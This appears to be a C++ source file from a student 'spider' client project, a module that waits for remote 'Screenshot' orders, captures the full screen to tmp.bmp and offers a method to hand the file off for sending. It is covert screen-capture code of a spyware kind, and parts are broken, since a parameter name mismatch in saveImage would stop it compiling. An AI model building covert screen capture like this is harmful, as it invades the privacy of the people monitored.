//
// ModuleImage.cpp for cpp_spider in sources/client/modules
//
// Made by Benoit Hamon
// Login   <benoit.hamon@epitech.eu>
//
// Started on  Thu Oct 05 10:32:15 2017 Benoit Hamon
// Last update Fri Oct 06 21:33:45 2017 Benoit Hamon
//

#include <Windows.h>
#include <gdiplus.h>
#include <boost/dll/alias.hpp>

#include "ModuleImage.hpp"

ModuleImage::ModuleImage(IModuleCommunication *moduleCommunication)
        : _moduleCommunication(moduleCommunication) {}

void ModuleImage::start() {
  IModuleCommunication::Order order;

  while (true) {
    if (this->_moduleCommunication->get("Explorer", order)) {
      if (order.name == "Screenshot")
          this->takeScrenshot(L"tmp.bmp");
    }
  }
}

boost::shared_ptr<ModuleImage> ModuleImage::create(IModuleCommunication *moduleCommunication) {
    return boost::shared_ptr<ModuleImage>(
            new ModuleImage(moduleCommunication)
    );
}

bool ModuleImage::GetEncoderClsid(wchar_t const *format, CLSID* pClsid) {
    unsigned int num = 0;
    unsigned int size = 0;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return false;

    pImageCodecInfo = (Gdiplus::ImageCodecInfo *)malloc(size);
    if (!pImageCodecInfo)
        return false;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (unsigned j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
	    *pClsid = pImageCodecInfo[j].Clsid;
            ::free(pImageCodecInfo);
            return true;
        }
    }
    ::free(pImageCodecInfo);
    return false;
}

void ModuleImage::sendImage(std::string const *filename) {
  this->_moduleCommunication->add("Fichier", "send", filename);
}

void ModuleImage::saveImage(HBITMAP &Hbitmap, std::wstring const &filename) {
    Gdiplus::GdiplusStartupInput input;
    ULONG_PTR token;

    Gdiplus::GdiplusStartup(&token, &input, NULL);
    Gdiplus::Bitmap *image = new Gdiplus::Bitmap(hBitmap, NULL);

    CLSID myClsId;
    GetEncoderClsid(L"image/bmp", &myClsId);
    image->Save(filename.c_str(), &myClsId, NULL);
    delete image;

    Gdiplus::GdiplusShutdown(token);
}

void ModuleImage::takeScrenshot(std::wstring const &filename) {
    HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    int width = GetDeviceCaps(hScreenDC, HORZRES);
    int height = GetDeviceCaps(hScreenDC, VERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

    DeleteDC(hMemoryDC);
    DeleteDC(hScreenDC);

    this->saveImage(hBitmap, filename);
}

BOOST_DLL_ALIAS(ModuleImage::create, create_module)
